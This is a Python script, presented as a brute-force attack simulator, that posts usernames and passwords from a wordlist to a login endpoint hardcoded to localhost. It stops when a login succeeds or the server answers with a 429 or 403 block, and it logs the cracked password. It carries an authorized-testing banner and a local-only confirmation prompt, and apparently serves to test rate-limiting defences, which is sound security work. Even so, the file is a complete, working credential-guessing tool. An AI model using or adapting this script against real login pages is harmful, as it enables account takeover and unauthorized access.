"""
Brute Force Attack Simulation
Attempts to guess password for a single username using a wordlist
"""
import requests
import time
import argparse
import json
from datetime import datetime

TARGET_URL = "http://localhost:5000/login"

def print_banner():
    print("=" * 60)
    print("  BRUTE FORCE ATTACK SIMULATOR")
    print("  WARNING: For authorized testing only!")
    print("=" * 60)
    print()

def run_attack(username, wordlist_path, verbose=False, delay=0):
    """
    Execute brute force attack

    Args:
        username: Target username
        wordlist_path: Path to password wordlist
        verbose: Print each attempt
        delay: Delay between requests in seconds
    """
    results = {
        "attack_type": "bruteforce",
        "username": username,
        "attempts": 0,
        "success": 0,
        "blocked": 0,
        "failed": 0,
        "start_time": time.time(),
        "cracked_password": None
    }

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Username: {username}")
    print(f"[*] Wordlist: {wordlist_path}")
    print(f"[*] Starting attack at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {wordlist_path}")
        return results

    for password in passwords:
        results["attempts"] += 1

        try:
            response = requests.post(
                TARGET_URL,
                data={"username": username, "password": password},
                timeout=5
            )

            if response.status_code == 200 or 'dashboard' in response.url:
                results["success"] += 1
                results["cracked_password"] = password
                if verbose:
                    print(f"[SUCCESS] ✓ Password found: {password}")
                print(f"\n[+] ATTACK SUCCESSFUL!")
                print(f"[+] Username: {username}")
                print(f"[+] Password: {password}")
                print(f"[+] Attempts: {results['attempts']}")
                break

            elif response.status_code in [429, 403]:
                results["blocked"] += 1
                if verbose:
                    print(f"[BLOCKED] ✗ Attack blocked after {results['attempts']} attempts")
                print(f"\n[-] ATTACK BLOCKED")
                print(f"[-] Status: {response.status_code}")
                print(f"[-] Attempts before block: {results['attempts']}")
                break

            else:
                results["failed"] += 1
                if verbose:
                    print(f"[FAIL] {results['attempts']:4d} | {password}")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"[ERROR] Request failed: {e}")
            results["failed"] += 1

        if delay > 0:
            time.sleep(delay)

    results["end_time"] = time.time()
    results["duration_sec"] = results["end_time"] - results["start_time"]

    return results

def save_results(results):
    """Save attack results to file"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"results/bruteforce_{timestamp}.json"

    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n[*] Results saved to: {filename}")

def print_summary(results):
    """Print attack summary"""
    print("\n" + "=" * 60)
    print("  ATTACK SUMMARY")
    print("=" * 60)
    print(f"Attack Type:       {results['attack_type']}")
    print(f"Total Attempts:    {results['attempts']}")
    print(f"Successful:        {results['success']}")
    print(f"Failed:            {results['failed']}")
    print(f"Blocked:           {results['blocked']}")
    print(f"Duration:          {results['duration_sec']:.2f} seconds")
    if results['success'] > 0:
        print(f"Cracked Password:  {results['cracked_password']}")
    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force Attack Simulator")
    parser.add_argument("-u", "--username", required=True, help="Target username")
    parser.add_argument("-w", "--wordlist", required=True, help="Password wordlist file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("--save", action="store_true", help="Save results to file")

    args = parser.parse_args()

    print_banner()

    # Confirm local testing
    confirm = input("Confirm this is LOCAL TESTING ONLY (yes/no): ")
    if confirm.lower() != 'yes':
        print("Attack cancelled.")
        exit(0)

    results = run_attack(args.username, args.wordlist, args.verbose, args.delay)
    print_summary(results)

    if args.save:
        save_results(results)
